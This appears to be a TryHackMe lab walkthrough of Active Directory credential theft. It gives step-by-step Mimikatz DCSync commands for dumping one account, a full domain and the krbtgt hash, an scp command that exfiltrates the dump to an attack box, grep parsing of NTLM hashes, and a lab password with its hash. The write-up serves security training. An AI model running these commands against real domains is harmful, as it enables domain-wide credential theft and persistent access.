#Lab Architecture

Two-domain forest used throughout the room. za.tryhackme.loc is a child domain of tryhackme.loc. All DCSync and ticket-forging activity in this walkthrough targets the child DC, THMCHILDDC (10.200.73.101), from the low-priv workstation THMWRK1.

1Connect & Load Mimikatz

SSH into THMWRK1 with the Domain Admin credentials and launch Mimikatz from the pre-staged tools folder.

Host: THMWRK1User: ZA\administrator 
C:\Tools\mimikatz_trunk\x64\mimikatz.exe

Confirmed running as za\administrator on THMWRK1 — see Fig. 2 in the next step, which captures this launch together with the first DCSync command from the same terminal session.

2DCSync a Single Account

Before pulling the whole domain, validate that the Domain Admin account actually has replication rights by DCSyncing one low-privilege user first (mandy.armstrong).

mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:mandy.armstrong

Fig. 2 — Mimikatz 2.2.0 launched on THMWRK1, then a single-account DCSync against mandy.armstrong. Returns the object RDN, UAC flags, SID/RID, and the Hash NTLM credential block.

3Verify the NTLM Hash

Sanity-check the DCSync result by running a known plaintext candidate through an NTLM hash generator and comparing it against what Mimikatz returned.

Fig. 3 — Plaintext Julius1985 hashed on codebeautify.org/ntlm-hash-generator produces 3740AD538D823CCDA315CB14A98A57E4, matching the DCSync output exactly (case-insensitive) — confirming the password for the synced account.

This step is optional for the attack itself but useful during the CTF to confirm you've recovered a crackable/known plaintext for an account.

4Enable Logging & DCSync /all

Switch from syncing a single object to pulling every object in the domain. First, point Mimikatz's logging at a file so the (very long) output is captured, then fire the full sync.

mimikatz # log mandy_dcdump.txt
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all

Fig. 4 — Logging target set to mandy_dcdump.txt, then /all kicks off a full export of the za.tryhackme.loc domain object-by-object (users, groups, computers, OUs).

Takes several minutes Exit Mimikatz after completion to flush the log file to disk

5Exfiltrate the Dump File

Pull the completed dump off THMWRK1 and onto the attack box via scp. Make sure the local SSH service is running first.

# On attack box (Kali) — start SSH service
sudo systemctl start ssh

# On THMWRK1 — copy the dump out
scp C:\Tools\mandy_dcdump.txt shubham@10.150.73.7:/home/shubham/OSCP/Persistent/

Fig. 5 — mandy_dcdump.txt (260 KB) transferred at 666 KB/s from THMWRK1 to the Kali box over SSH. Remember to start the local ssh service on Kali first — it's stopped by default.

Gotcha

If scp complains the remote path "Is a directory", either pre-create it (mkdir -p over SSH), drop the trailing slash, or specify the destination filename explicitly. On OpenSSH 9.x the SFTP-backed scp can also need the legacy protocol flag -O.

6Parse Usernames From the Dump

With the full dump local, grep out every SAM Username line to get an inventory of every object (users, built-in groups, and machine accounts) that was synced.

cat mandy_dcdump.txt | grep "SAM Username"

Fig. 6 — Full object inventory recovered: built-in groups (Guest, Remote Desktop Users, Domain Computers...) plus every domain user account synced from the DC.

7Parse NTLM Hashes From the Dump

Same approach, but grep for every Hash NTLM line — this is the entire domain's NTLM hash list, ready for offline cracking or pass-the-hash.

cat mandy_dcdump.txt | grep "Hash NTLM"

Fig. 7 — Every NTLM hash in the domain, one per account, in the same order as the username list in Fig. 6 — the two lists line up index-for-index.

8Extract the krbtgt Hash

The single most important credential in the whole room — the krbtgt account signs every Kerberos TGT in the domain. Its NTLM hash is what makes Golden Ticket forging possible later in Task 3.

Name resolution for a bare krbtgt can throw ERROR_NOT_UNIQUE across a multi-domain forest — qualify it with the NetBIOS domain prefix:

mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:ZA\krbtgt

Fig. 8 — Targeted DCSync of ZA\krbtgt. Account is disabled (expected — krbtgt is never meant to log in interactively) but still yields full credential material: NTLM hash, Kerberos AES keys, and WDigest hashes.

✓Summary & Why It Matters

What happened: Starting from Domain Admin creds on a single workstation, DCSync abused legitimate domain-replication rights (normally reserved for real DCs and Domain Admins) to pull every credential in the domain without ever touching LSASS or the NTDS.dit file directly. This is detection-light compared to a full NTDS dump via ntdsutil or volume shadow copy.

Why the krbtgt hash specifically matters: It never rotates by default, is only invalidated by two manual password resets by the blue team, and lets an attacker forge Golden Tickets for any user — including disabled or non-existent ones — entirely offline, without further contact with the DC. That's the next step in this walkthrough (Task 3 — Persistence through Tickets).
